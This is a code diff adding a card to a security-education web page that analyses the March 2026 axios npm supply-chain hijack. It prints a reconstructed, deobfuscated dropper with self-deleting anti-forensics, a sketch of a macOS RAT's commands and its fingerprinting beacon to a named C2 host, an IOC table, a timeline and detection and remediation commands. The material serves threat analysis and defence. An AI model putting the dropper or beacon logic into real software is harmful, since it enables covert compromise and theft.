@@ -458,6 +458,159 @@ node app.js
 
 # ── Check TERMINAL 1 / dashboard — every .env token is there ──`;
 
+const axiosHijackPackageJson = `// Attacker modifies axios package.json to add a hidden dependency
+// No source files are changed — only package.json gets a new entry
+
+{
+  "name": "axios",
+  "version": "1.14.1",
+  "description": "Promise based HTTP client for the browser and node.js",
+  "main": "index.js",
+  "dependencies": {
+    "follow-redirects": "^1.15.6",
+    "form-data": "^4.0.0",
+    "proxy-from-env": "^1.1.0",
+    "plain-crypto-js": "4.2.1"       // <-- INJECTED by attacker
+  }
+}`;
+
+const axiosDropperCode = `// plain-crypto-js@4.2.1 — setup.js (postinstall hook)
+// This runs AUTOMATICALLY when 'npm install axios@1.14.1' resolves dependencies.
+// The real dropper used double obfuscation — shown here deobfuscated for education.
+
+const os = require('os');
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+
+// --- Layer 1: Reversed Base64 with padding substitution ---
+// --- Layer 2: XOR cipher (key: "OrDeR_7077", constant: 333) ---
+// Once deobfuscated, the payload detects the platform:
+
+const platform = os.platform();
+const c2Host = 'sfrclak[.]com';  // Attacker C2 (IP: 142.11.206.73)
+const c2Port = 8000;
+
+if (platform === 'darwin') {
+  // macOS: AppleScript downloads binary to /Library/Caches/com.apple.act.mond
+  // Spoofs Apple daemon name. Beacons every 60s with fake IE8/WinXP User-Agent.
+  // Commands: peinject, runscript, rundir, kill
+} else if (platform === 'win32') {
+  // Windows: VBScript copies PowerShell to %PROGRAMDATA%\\wt.exe
+  // Masquerades as Windows Terminal. Hidden RAT with exec policy bypass.
+} else {
+  // Linux: Python RAT to /tmp/ld.py, launched via nohup python3
+  // Detaches from terminal, orphaned background process.
+}
+
+// --- Anti-forensics: Self-deletion ---
+// After deploying the RAT, the dropper erases all evidence:
+const selfDir = __dirname;
+fs.unlinkSync(path.join(selfDir, 'setup.js'));       // Delete dropper
+fs.unlinkSync(path.join(selfDir, 'package.json'));   // Delete postinstall trigger
+fs.renameSync(                                        // Replace with clean copy
+  path.join(selfDir, 'package.md'),
+  path.join(selfDir, 'package.json')
+);
+// Inspecting node_modules/plain-crypto-js after the fact shows NOTHING suspicious.`;
+
+const axiosRatCapabilities = `// macOS RAT capabilities (decompiled from /Library/Caches/com.apple.act.mond)
+
+const COMMANDS = {
+  'peinject': async (payload) => {
+    // Receives Base64 binary from C2, decodes it,
+    // writes to hidden temp file (/private/tmp/.XXXXXX),
+    // performs ad-hoc codesign to bypass Gatekeeper,
+    // then executes it.
+  },
+  'runscript': async (cmd) => {
+    // Runs arbitrary shell commands via /bin/sh
+    // OR executes AppleScript files via osascript
+  },
+  'rundir': async () => {
+    // Enumerates filesystem metadata from:
+    // /Applications, ~/Library, ~/Application Support
+    // Maps installed software for further targeting
+  },
+  'kill': () => process.exit(0)
+};
+
+// Beacon: every 60 seconds to C2 with victim fingerprint
+setInterval(() => {
+  const fingerprint = {
+    id: generateVictimId(16),    // Random 16-char unique ID
+    hostname: os.hostname(),
+    username: os.userInfo().username,
+    os_version: execSync('sw_vers -productVersion').toString().trim(),
+    arch: process.arch === 'arm64' ? 'mac_arm' : 'mac_x64',
+    boot_time: execSync('sysctl -n kern.boottime').toString(),
+    processes: execSync('ps aux').toString()
+  };
+  // User-Agent: fake IE8 on Windows XP (to blend in with noise)
+  beacon(fingerprint, { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)' });
+}, 60000);`;
+
+const axiosIocTable = `IOC Type         | Value                              | Notes
+─────────────────┼────────────────────────────────────┼──────────────────────────────
+Malicious pkg    | axios@1.14.1, axios@0.30.4         | Published Mar 31, removed ~3hrs later
+Hidden dep       | plain-crypto-js@4.2.1              | postinstall: "node setup.js"
+C2 Domain        | sfrclak[.]com                      | Port 8000
+C2 IP            | 142.11.206.73                      | Port 8000
+macOS artifact   | /Library/Caches/com.apple.act.mond | Spoofs Apple daemon name
+Windows artifact | %PROGRAMDATA%\\wt.exe               | Masquerades as Windows Terminal
+Linux artifact   | /tmp/ld.py                         | Python RAT via nohup
+XOR Key          | OrDeR_7077 (constant: 333)         | Used in dropper obfuscation
+Attribution      | Sapphire Sleet (DPRK)              | Microsoft Threat Intelligence`;
+
+const axiosTimeline = `Timeline (UTC)                    Event
+───────────────────────────────── ─────────────────────────────────────────────
+~2 weeks before Mar 31            Social engineering campaign targets maintainer
+Mar 30, 05:57 UTC                 plain-crypto-js@4.2.0 published (clean, builds history)
+Mar 30, 23:59 UTC                 plain-crypto-js@4.2.1 published (malicious payload)
+Mar 31, 00:21 UTC                 axios@1.14.1 published with injected dependency
+Mar 31, ~01:00 UTC                axios@0.30.4 published with same payload
+Mar 31, ~01:00 UTC                Community reports issues — attacker DELETES them
+Mar 31, 01:38 UTC                 Collaborator DigitalBrainJS opens deprecation PR
+Mar 31, 03:15 UTC                 Malicious axios versions removed from npm
+Mar 31, 03:29 UTC                 plain-crypto-js removed from npm`;
+
+const axiosCheckCommands = `# ── Step 1: Check if you installed the malicious versions ──
+
+# Check package-lock.json
+grep -E "axios@(1\\.14\\.1|0\\.30\\.4)|plain-crypto-js" package-lock.json
+
+# Check yarn.lock
+grep -E "axios@.*(1\\.14\\.1|0\\.30\\.4)|plain-crypto-js" yarn.lock
+
+# Check dependency tree
+npm ls plain-crypto-js
+
+# ── Step 2: Check for IOCs on your system ──
+
+# macOS
+ls -la /Library/Caches/com.apple.act.mond 2>/dev/null && echo "FOUND — COMPROMISED" || echo "Clean"
+
+# Windows (PowerShell)
+# Test-Path "$env:PROGRAMDATA\\wt.exe"
+
+# Linux
+ls -la /tmp/ld.py 2>/dev/null && echo "FOUND — COMPROMISED" || echo "Clean"
+
+# Network (check for C2 connections)
+# macOS/Linux:
+lsof -i @142.11.206.73 2>/dev/null
+# Or check DNS logs for sfrclak.com
+
+# ── Step 3: If affected — ASSUME FULL COMPROMISE ──
+
+# 1. Isolate the machine immediately
+# 2. Rotate ALL secrets: API keys, SSH keys, npm tokens, cloud creds
+# 3. Rebuild from a known-clean snapshot (don't try to "clean")
+# 4. Audit CI/CD build logs for the Mar 31 00:21-03:15 UTC window
+
+# ── Prevention: Use npm ci + lockfiles in CI ──
+npm ci --ignore-scripts    # Enforces lockfile, skips postinstall hooks`;
+
 const typosquatCode = `// Package: "lodahs" (typosquat of "lodash")
 
 // Step 1: Re-export the real package (stealth)
@@ -587,6 +740,39 @@ export default function Demos() {
 
         <h4 style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 6: Run It Live</h4>
         <CodeBlock language="bash" filename="two demo options — visual or terminal" code={tokenStealerSteps} />
+      </DemoCard>
+
+      <DemoCard
+        title="Axios npm Hijack — Real-World Supply Chain Attack (March 2026)"
+        description="Breakdown of the March 31, 2026 attack where North Korean state actors (Sapphire Sleet) compromised Axios lead maintainer's npm account via social engineering + RAT malware, then published two malicious versions (1.14.1 and 0.30.4) that silently deployed cross-platform RATs to any machine running npm install. Axios has 100M+ weekly downloads. The attack was live for ~3 hours."
+        tag="Demo E // Maintainer Account Hijack + Hidden Dependency RAT"
+      >
+        <h4 style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>The Injected Dependency (package.json diff)</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          The attacker didn&apos;t touch ANY Axios source code. They only added <code>plain-crypto-js@4.2.1</code> to the dependencies. A &ldquo;clean&rdquo; v4.2.0 was published 18 hours earlier to build registry history.
+        </p>
+        <CodeBlock language="json" filename="axios@1.14.1/package.json (modified by attacker)" code={axiosHijackPackageJson} />
+
+        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>The Dropper: Double-Obfuscated &amp; Self-Erasing</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          The <code>postinstall</code> hook in <code>plain-crypto-js</code> ran <code>setup.js</code> automatically during <code>npm install</code>. The script used reversed Base64 + XOR cipher to evade static analysis, then deployed platform-specific RATs and <strong>erased all traces of itself</strong>.
+        </p>
+        <CodeBlock language="javascript" filename="plain-crypto-js@4.2.1/setup.js — THE DROPPER (deobfuscated)" code={axiosDropperCode} />
+
+        <h4 style={{ color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>macOS RAT Capabilities (decompiled)</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          The macOS payload dropped to <code>/Library/Caches/com.apple.act.mond</code> (spoofing an Apple daemon). It beaconed every 60 seconds and accepted 4 commands from the C2.
+        </p>
+        <CodeBlock language="javascript" filename="macOS RAT — capabilities breakdown" code={axiosRatCapabilities} />
+
+        <h4 style={{ color: 'var(--accent-purple)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Indicators of Compromise (IOCs)</h4>
+        <CodeBlock language="text" filename="IOC reference table" code={axiosIocTable} />
+
+        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Attack Timeline</h4>
+        <CodeBlock language="text" filename="timeline — March 30–31, 2026" code={axiosTimeline} />
+
+        <h4 style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Check If You&apos;re Affected + Remediation</h4>
+        <CodeBlock language="bash" filename="detection and response commands" code={axiosCheckCommands} />
       </DemoCard>
 
       <DemoCard
